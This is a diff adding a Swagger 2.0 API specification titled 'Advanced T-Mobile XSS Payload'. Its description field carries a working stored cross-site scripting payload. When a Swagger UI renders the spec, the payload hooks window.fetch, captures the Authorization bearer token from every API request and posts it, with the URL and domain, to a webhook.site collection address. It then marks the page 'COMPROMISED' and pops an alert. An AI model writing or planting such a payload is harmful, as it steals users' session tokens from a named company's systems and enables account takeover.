@@ -1,0 +1,42 @@
+swagger: '2.0'
+info:
+  title: "Advanced T-Mobile XSS Payload"
+  description: |
+    <img src=x onerror="
+    // Intercept all fetch requests to steal Bearer tokens
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      const [url, options] = args;
+      
+      // Log all API requests
+      if (options && options.headers) {
+        const authHeader = options.headers.Authorization || options.headers.authorization;
+        if (authHeader) {
+          fetch('https://webhook.site/your-unique-id', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'TOKEN_INTERCEPTED',
+              url: url,
+              authorization: authHeader,
+              timestamp: new Date().toISOString(),
+              domain: document.domain
+            })
+          });
+        }
+      }
+      
+      return originalFetch.apply(this, args);
+    };
+    
+    // Show success indicator
+    document.title = '🔥 COMPROMISED - T-Mobile Swagger UI';
+    alert('Advanced XSS Active - Token harvesting enabled');
+    ">
+  version: '2.0'
+paths:
+  /credential-stores:
+    get:
+      responses:
+        '200':
+          description: Token harvesting active
